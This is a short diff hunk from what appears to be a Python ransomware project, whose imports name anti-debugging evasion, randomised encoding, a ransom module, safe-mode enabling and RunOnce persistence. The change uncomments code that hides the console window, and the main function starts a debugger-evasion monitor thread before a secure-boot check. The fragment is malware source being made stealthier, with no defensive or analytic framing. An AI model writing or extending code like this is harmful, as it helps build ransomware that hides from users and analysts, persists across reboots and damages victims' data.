@@ -13,9 +13,9 @@ from Evasion.Randomize import random_base64,random_byte,random_list,random_a85
 from random import randrange,choice
 from Encryption.Utils import is_secure_boot,enable_safemode,addRun_once
 from Encryption.Ransom import example_ransom
-#SW_HIDE = 0
-#hWnd = windll.kernel32.GetConsoleWindow()
-#windll.user32.ShowWindow(hWnd,SW_HIDE)
+SW_HIDE = 0
+hWnd = windll.kernel32.GetConsoleWindow()
+windll.user32.ShowWindow(hWnd,SW_HIDE)
 def main():
     Thread(target=debugEvasion.process_monitor,args=()).start()
     if is_secure_boot(): #the function is not recognizing secure boot!
